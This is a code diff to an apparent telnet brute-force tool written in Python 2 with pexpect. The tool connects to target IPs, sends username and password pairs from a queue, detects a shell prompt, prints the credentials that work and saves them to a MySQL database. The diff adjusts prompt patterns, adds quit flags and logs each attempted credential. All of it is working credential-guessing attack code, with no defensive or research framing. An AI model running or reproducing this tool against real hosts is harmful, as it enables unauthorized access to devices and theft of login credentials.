@@ -14,6 +14,7 @@ class Connection:
         self.hLog = handle
         self.auth = None
         self.child = None
+        self.bQuit = False
 
     def new_state(self, newstate):
         self._state = newstate
@@ -30,33 +31,38 @@ class conn_state:
     @staticmethod
     def _run(conn):
         try:
-            conn.hLog.write("\r\n#!*********** %s **********!#\r\n" % conn.ip)
             conn.child = pexpect.spawn("telnet %s" % conn.ip)
             conn.child.logfile_read = conn.hLog
-            index = conn.child.expect(["(?i)username:", "(?i)enter:", "(?i)login:",
-                                       "(?i)reject:", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
+            index = conn.child.expect(["sername:", "nter:", "ogin:","ccount:",
+                                    "eject","refused","denied", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
             if index < 4:
                 # print "Got flag %s" % conn.ip
                 conn.auth = None
                 conn.new_state(user_state)
             else:
-                conn.new_state(None)
+                conn.bQuit = True
+                return
         except:
-            conn.new_state(None)
+            conn.hLog.write("\r\nSomething wrong in  conn_state._run().")
+            conn.new_state(conn)
 
 class user_state:
     @staticmethod
     def _run(conn):
         try:
             conn.auth = conn.auth_queue.pop()
+        except IndexError:
+            conn.bQuit = True
+            return
         except:
-            conn.new_state(None)
+            conn.bQuit = True
             return
 
         user = conn.auth[0]
+        conn.hLog.write("\r\nPreparing send username (%s) to remote host." % user)
         conn.child.sendline(user)
-        index = conn.child.expect(["(?i)password:", "(?i)username:", "(?i)account:",
-                                   "(?i)login:", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
+        index = conn.child.expect(["ssword:", "sername:", "nter:","ccount:",
+                                   "ogin:", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
         if index == 0:
             conn.new_state(passwd_state)
         elif index < 5:
@@ -71,15 +77,17 @@ class passwd_state:
         if conn.auth:
             passwd = conn.auth[1]
         else:
-            conn.new_state(None)
+            conn.bQuit = True
             return
+
+        conn.hLog.write("\r\nPreparing send password (%s) to remote host." % passwd)
         conn.child.sendline(passwd)
         #"(?i)username:","(?i)enter:","(?i)account:","(?i)login:","(?i)pssword:",
-        index = conn.child.expect([r"[#->$~/]", "(?i)username", "(?i)enter", "(?i)account",
-                                   "(?i)login", "(?i)pssword", "(?i)error", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
+        index = conn.child.expect([r"[>$~/]", "sername:", "nter:", "ccount:",
+                                   "login:", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
         if index == 0:
             conn.new_state(confirm_state)
-        elif index < 6:
+        elif index < 4 and index > 0:
             conn.new_state(user_state)
         else:
             conn.new_state(conn_state)
@@ -91,7 +99,7 @@ class confirm_state:
         try:
             user, passwd = conn.auth
             if conn.auth == ("user", "password"):
-                conn.new_state(None)
+                conn.bQuit = True
                 return
             print "Got password [%s] %s:%s" % (conn.ip, user, passwd)
             db = MySQLdb.connect("localhost", "telnet",
@@ -103,5 +111,6 @@ class confirm_state:
             print "[report] One result import to database"
         except:
             db.rollback()
+        conn.bQuit = True
         conn.new_state(None)
         db.close()
